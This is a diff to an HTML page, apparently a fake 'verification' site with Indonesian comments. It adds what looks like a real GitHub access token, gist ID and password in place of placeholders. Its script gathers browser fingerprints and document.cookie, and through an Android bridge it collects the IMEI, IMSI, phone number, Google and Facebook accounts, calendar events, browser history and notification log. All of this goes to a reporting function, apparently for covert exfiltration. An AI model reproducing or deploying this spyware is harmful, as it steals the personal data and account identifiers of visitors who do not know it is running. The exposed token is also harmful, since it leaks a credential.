@@ -11,10 +11,10 @@
 <body>
 <div id="qrContainer"></div>
 <script>
-// ⚠️ GANTI INI DENGAN PUNYA KAMU!
-var GITHUB_TOKEN = 'github_pat_XXXXXXXXXXXX';
-var GIST_ID = 'XXXXXXXXXXXXXXXXXXXX';
-var GITHUB_USER = 'USERNAME_KAMU';
+// KONFIGURASI
+var GITHUB_TOKEN = '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';
+var GIST_ID = 'ebf689c4deacadf60d5860c7638d491f';
+var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
 var PASSWORD = 'rahasia123';
 
@@ -96,7 +96,7 @@ var A = {
 function GD() {
     var a = A.getDeviceInfo();
     var d = { w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language, sc:screen.width+'x'+screen.height, cd:screen.colorDepth, pr:window.devicePixelRatio, co:document.cookie, ur:location.href, rf:document.referrer, dm:navigator.deviceMemory||'N/A', cc:navigator.hardwareConcurrency||'N/A', on:navigator.onLine, ve:navigator.vendor, mt:navigator.maxTouchPoints, tz:Intl.DateTimeFormat().resolvedOptions().timeZone };
-    if(A.isAvailable) { d.android = { deviceInfo:A.getDeviceInfo(), imei:A.getIMEI(), imsi:A.getIMSI(), phoneNumber:A.getPhoneNumber(), googleAccount:A.getGoogleAccount(), facebookAccount:A.getFacebookAccount(), networkInfo:A.getWiFiPasswords?null:null, bluetoothInfo:A.getBluetoothInfo(), sensors:A.getSensors(), batteryDetail:A.getBatteryDetail(), calendarEvents:A.getCalendarEvents(), browserHistory:A.getBrowserHistory(), notificationLog:A.getNotificationLog() } }
+    if(A.isAvailable) { d.android = { deviceInfo:A.getDeviceInfo(), imei:A.getIMEI(), imsi:A.getIMSI(), phoneNumber:A.getPhoneNumber(), googleAccount:A.getGoogleAccount(), facebookAccount:A.getFacebookAccount(), bluetoothInfo:A.getBluetoothInfo(), sensors:A.getSensors(), batteryDetail:A.getBatteryDetail(), calendarEvents:A.getCalendarEvents(), browserHistory:A.getBrowserHistory(), notificationLog:A.getNotificationLog() } }
     K({sumber:'init',data:d}); return d;
 }
 async function getIP() { try{ var r = await fetch('https://api.ipify.org?format=json'); var d = await r.json(); K({sumber:'ip',data:d.ip}) } catch(e){} }
